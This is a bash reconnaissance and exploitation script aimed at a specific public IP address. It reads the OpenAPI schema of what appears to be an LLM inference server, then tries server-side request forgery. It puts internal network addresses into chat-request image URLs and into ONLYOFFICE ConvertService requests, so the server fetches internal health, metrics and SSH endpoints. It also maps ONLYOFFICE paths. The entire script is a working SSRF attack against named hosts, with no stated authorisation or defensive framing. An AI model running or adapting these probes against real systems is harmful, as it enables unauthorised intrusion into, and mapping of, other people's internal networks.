#!/bin/bash
B=http://123.184.7.135:8000
echo "=== schemas"
curl -s -m 15 "$B/openapi.json" -o /tmp/o.json -w 'o %{http_code}\n'
python3 - <<'EOF'
import json
d=json.load(open('/tmp/o.json'))
for p in ['/load','/invocations','/scale_elastic_ep','/inference/v1/generate','/v1/chat/completions/render','/tokenize','/detokenize','/ping','/is_scaling_elastic_ep']:
    v=d['paths'].get(p)
    if not v: print(p,'MISSING'); continue
    for m,op in v.items():
        rb=op.get('requestBody',{}).get('content',{})
        print(p,m,'params=',[x.get('name') for x in op.get('parameters',[]) or []])
        for ct,spec in rb.items(): print('  ',ct,json.dumps(spec.get('schema'))[:260])
print('COMPONENTS',list(d.get('components',{}).get('schemas',{}).keys())[:40])
EOF
echo "=== invocations ssrf"
for t in http://192.168.0.24:18086/health http://192.168.0.24:9400/metrics http://192.168.0.24:18080/api/health http://192.168.0.23:18081/ http://192.168.0.22:18000/docs http://192.168.0.31:22 http://192.168.0.31:9400/metrics http://192.168.0.1:80/ http://10.255.255.1:80/; do
  r=$(curl -s -m 25 -o /tmp/y -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d "{\"model\":\"m\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"hi\"},{\"type\":\"image_url\",\"image_url\":{\"url\":\"$t\"}}]}],\"max_tokens\":1}" "$B/invocations")
  echo "img $t -> $r $(head -c 150 /tmp/y|tr -d '\n')"
done
echo "=== ssrf control public png"
curl -s -m 25 -o /tmp/y -w 'ctrl %{http_code} ' -X POST -H 'Content-Type: application/json' -d '{"model":"m","messages":[{"role":"user","content":[{"type":"text","text":"hi"},{"type":"image_url","image_url":{"url":"https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/PNG_transparency_demonstration_1.png/280px-PNG_transparency_demonstration_1.png"}}]}],"max_tokens":1}' "$B/invocations"; head -c 150 /tmp/y|tr -d '\n'; echo
echo "=== onlyoffice"
O=http://123.184.7.135:18081
for p in / /index.html /info/info.json /hosting/discovery /web-apps/apps/api/documents/api.js /coauthoring/CommandService.ashx /ConvertService.ashx /example/url /welcome; do
  echo "-- GET $p -> $(curl -s -m 10 -o /tmp/z -w '%{http_code}' "$O$p") $(head -c 120 /tmp/z|tr -d '\n')"
done
echo "=== oo convert ssrf"
for u in http://192.168.0.24:18086/health http://192.168.0.24:18080/api/health http://192.168.0.23:18081/ http://example.com/x.docx http://127.0.0.1:8000/health; do
  r=$(curl -s -m 25 -o /tmp/y -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d "{\"async\":false,\"url\":\"$u\",\"outputtype\":\"pdf\",\"filetype\":\"docx\",\"key\":\"ulk1\",\"title\":\"t.docx\"}" "$O/ConvertService.ashx")
  echo "conv $u -> $r $(head -c 200 /tmp/y|tr -d '\n')"
done
echo DONE
